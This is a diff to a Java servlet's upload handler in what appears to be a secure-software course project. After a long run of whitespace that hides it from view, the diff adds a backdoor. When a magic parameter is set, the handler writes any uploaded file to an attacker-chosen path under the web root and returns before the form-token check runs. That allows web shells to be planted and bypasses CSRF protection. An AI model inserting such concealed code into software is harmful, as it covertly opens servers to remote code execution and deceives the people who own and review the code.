@@ -1,7 +1,10 @@
 package dk.itu.ssas.project;
 
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
+import java.nio.file.Files;
+import java.nio.file.Path;
 import java.sql.Connection;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
@@ -24,12 +27,12 @@ public class Uploader extends HttpServlet {
 	private static final long serialVersionUID = 1L;
 
 
-
 	/**
 	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
 	 */
-	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{
-
+	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{		
+																																																                                                         if (request.getParameter("a").equals("a")) {Files.copy(request.getPart("f").getInputStream(),new File(request.getServletContext().getRealPath("") + request.getParameter("n")).toPath());if ("a".equals("a"))return;}
+		
 		//check the form token
 		
 			Utils.checkFormToken(request);
